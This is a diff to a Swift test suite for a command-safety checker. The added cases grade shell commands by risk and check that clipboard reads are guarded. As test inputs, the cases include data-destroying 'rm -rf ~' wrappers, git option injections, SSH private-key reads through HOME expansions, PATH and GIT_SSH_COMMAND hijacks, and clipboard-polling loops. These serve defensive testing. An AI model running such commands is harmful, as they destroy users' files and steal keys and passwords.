@@ -413,6 +413,59 @@ private let safetyCases: [SafetyCase] = [
     .init("osascript -e \"$s\"", .high),
     .init("python3 -c \"$(cat x.py)\"", .high),
     .init("pbpaste | wc -c", .low),
+
+    // Arithmetic that evaluates run-time content (a substitution's output, or a variable set
+    // from command output / read): zsh and bash run `a[$(cmd)]` embedded in it.
+    .init("(( $(curl -s http://x.example/n) ))", .blocked),
+    .init("d=$(curl -s http://x.example/n); (( d ))", .blocked),
+    .init("(( $(date +%s) % 2 ))", .high),
+    .init("x=$(date +%s); (( y = x + 1 ))", .high),
+    .init("read n < /tmp/n; (( n * 2 ))", .high),
+    .init("n=5; (( n * 2 ))", .low),
+    .init("(( i++ ))", .low),
+
+    // Wrappers that run their argument as a command (the `emulate -c` class).
+    .init("zpty p rm -rf ~", .blocked),
+    .init("script /dev/null rm -rf ~", .blocked),
+    .init("script -c 'rm -rf ~' /dev/null", .blocked),
+    .init("taskpolicy -b rm -rf ~", .blocked),
+    .init("sandbox-exec -n no-network rm -rf ~", .blocked),
+    .init("setsid rm -rf ~", .blocked),
+    .init("script /tmp/session.log", .low),
+    .init("taskpolicy -b -p 1234", .low),
+
+    // git options named by a unique abbreviation or an attached short value.
+    .init("git ls-remote --upl='rm -rf ~/Documents;:' .", .high),
+    .init("git ls-remote --upload-pac='rm -rf ~;:' .", .blocked),
+    .init("git clone -u'touch x' a b", .high),
+    .init("git rebase -x'touch x' main", .high),
+    .init("git grep --open-files-in-pag='touch x' foo", .high),
+    .init("git clone --recurse-submodules https://x.example/r a", .medium),
+
+    // More environment paths into running code.
+    .init("XDG_CONFIG_HOME=/tmp/x git status", .high),
+    .init("for GIT_SSH_COMMAND in 'touch x'; do :; done", .high),
+    .init("export GIT_SSH_COMMAND", .high),
+    .init("env -P /tmp/evil ls", .high),
+    .init(": ${(A)path::=/tmp/x}; ls", .high),
+    .init("export PATH", .low),
+    .init("PATH+=:/opt/homebrew/bin ls", .low),
+
+    // HOME-derived expansions with a modifier or subscript still reach the home folder.
+    .init("cat ${HOME:-x}/.ssh/id_rsa", .high),
+    .init("cat ${HOME:h}/.ssh/id_rsa", .high),
+    .init("cat $HOME:h/.ssh/id_rsa", .high),
+    .init("cat $HOME[1,-1]/.ssh/id_rsa", .high),
+    // A `cd` that might not take effect: a relative key path is judged against the old folder too.
+    .init("cd /nonexistent && cat .ssh/id_rsa", .high),
+    .init("cd /tmp && cat notes.txt", .low),
+    // An uninstaller-shaped delete under ~/Library needs approval, not a block.
+    .init("rm -rf ~/Library/*/com.vendor.app", .high),
+    .init("rm -rf ~/Library/*", .blocked),
+
+    // Clipboard reads after a delay or in a loop can catch a password copied mid-run.
+    .init("sleep 5; pbpaste", .high),
+    .init("while true; do pbpaste; sleep 1; done", .high),
 ]
 
 @Suite("CommandSafety")
@@ -630,10 +683,17 @@ struct CommandToolsShellTests {
 
 @Suite("osascript tools")
 struct CommandToolsOSATests {
+    /// A fresh, unique private pasteboard name. A named pasteboard is created empty on first
+    /// use, so the always-on concealed-item guard reads it (and finds nothing) instead of the
+    /// real clipboard, which a developer might have a password on.
+    private func emptyPrivatePasteboard() -> NSPasteboard.Name {
+        NSPasteboard.Name("dev.glide.tests.\(UUID().uuidString)")
+    }
+
     @Test func appleScriptReturnsItsResult() async throws {
         let dir = try makeTempDir()
         defer { try? FileManager.default.removeItem(at: dir) }
-        let out = try await OSAScriptTool(language: .appleScript).run(["script": "return 1 + 1"], context: context(dir))
+        let out = try await OSAScriptTool(language: .appleScript, pasteboardName: emptyPrivatePasteboard()).run(["script": "return 1 + 1"], context: context(dir))
         #expect(out.ok)
         #expect(out.text == "2")
     }
@@ -641,7 +701,7 @@ struct CommandToolsOSATests {
     @Test func jxaReturnsItsResult() async throws {
         let dir = try makeTempDir()
         defer { try? FileManager.default.removeItem(at: dir) }
-        let out = try await OSAScriptTool(language: .javaScript).run(["script": "[1, 2, 3].map(x => x * 2).join(',')"], context: context(dir))
+        let out = try await OSAScriptTool(language: .javaScript, pasteboardName: emptyPrivatePasteboard()).run(["script": "[1, 2, 3].map(x => x * 2).join(',')"], context: context(dir))
         #expect(out.ok)
         #expect(out.text == "2,4,6")
     }
@@ -649,7 +709,7 @@ struct CommandToolsOSATests {
     @Test func scriptErrorsAreReported() async throws {
         let dir = try makeTempDir()
         defer { try? FileManager.default.removeItem(at: dir) }
-        let out = try await OSAScriptTool(language: .appleScript).run(["script": "error \"nope\""], context: context(dir))
+        let out = try await OSAScriptTool(language: .appleScript, pasteboardName: emptyPrivatePasteboard()).run(["script": "error \"nope\""], context: context(dir))
         #expect(!out.ok)
         #expect(out.text.contains("nope"))
     }
@@ -1032,7 +1092,11 @@ struct CommandToolsSystemTests {
             }
         }
         for command in ["touch \(marker.path); pbpaste", "touch \(marker.path); p''bpaste | wc -c",
-                        "touch \(marker.path); osascript -e 'the clip''board'"] {
+                        "touch \(marker.path); osascript -e 'the clip''board'",
+                        // A script interpreter is refused even when its text never names the
+                        // clipboard: it could build the name at run time (finding 5, case 2/3).
+                        "touch \(marker.path); python3 -c 'print(1)'",
+                        "touch \(marker.path); node -e '1'"] {
             await refuses { try await ShellRunTool(pasteboardName: name).run(["command": .string(command)], context: ctx) }
         }
         #expect(!FileManager.default.fileExists(atPath: marker.path))
@@ -1040,10 +1104,19 @@ struct CommandToolsSystemTests {
         await refuses {
             try await OSAScriptTool(language: .javaScript, pasteboardName: name).run(["script": "Application.currentApplication().theClipboard()"], context: ctx)
         }
+        // A JXA script that builds the clipboard name from two pieces is still refused, because
+        // the guard runs for every script, not only when the source mentions the clipboard.
+        await refuses {
+            try await OSAScriptTool(language: .javaScript, pasteboardName: name).run(["script": "const n='theClip'+'board'; Application.currentApplication()[n]()"], context: ctx)
+        }
         #expect(CommandSafety.analyze("pbpaste | wc -c", cwd: nil, home: testHome).readsClipboard)
         #expect(CommandSafety.analyze("python3 -c 'import AppKit; print(AppKit.NSPasteboard.generalPasteboard())'", cwd: nil, home: testHome).readsClipboard)
         #expect(!CommandSafety.analyze("ls -la", cwd: nil, home: testHome).readsClipboard)
         #expect(!CommandSafety.analyze("git commit -m 'fix the clipboard bug'", cwd: nil, home: testHome).readsClipboard)
+        // A plain shell command (no script interpreter, no clipboard read) runs normally even
+        // while a concealed item is on the clipboard.
+        let ok = try await ShellRunTool(pasteboardName: name).run(["command": "echo hi"], context: ctx)
+        #expect(ok.ok && ok.text.contains("hi"))
     }
 }
 
@@ -1126,6 +1199,16 @@ struct CommandToolsParserTests {
         #expect(try pattern("/.ssh/*.pub").namesPublicKey)
         #expect(PathPattern.expandBraces("~/{a,b{c,d}}/x") == ["~/a/x", "~/bc/x", "~/bd/x"])
         #expect(PathPattern.expandBraces("${HOME}/x") == ["${HOME}/x"])
+    }
+
+    /// A brace product too large to enumerate must fail closed, not fall through to low risk.
+    @Test func hugeBraceExpansionFailsClosed() {
+        let alts = (0..<80).map { "d\($0)" }.joined(separator: ",")
+        #expect(PathPattern.expandBraces("~/{\(alts)}/.ssh/id_rsa") == nil)
+        // Reading a key through such a brace is still caught, and appending to a startup file
+        // is high rather than a quiet medium.
+        #expect(CommandSafety.assess("cat ~/{\(alts)}/.ssh/id_rsa", cwd: nil, home: testHome).risk == .high)
+        #expect(CommandSafety.assess("echo x >> ~/{\(alts)}/.zshrc", cwd: nil, home: testHome).risk == .high)
     }
 
     @Test func glidePreferencesAreSensitive() {
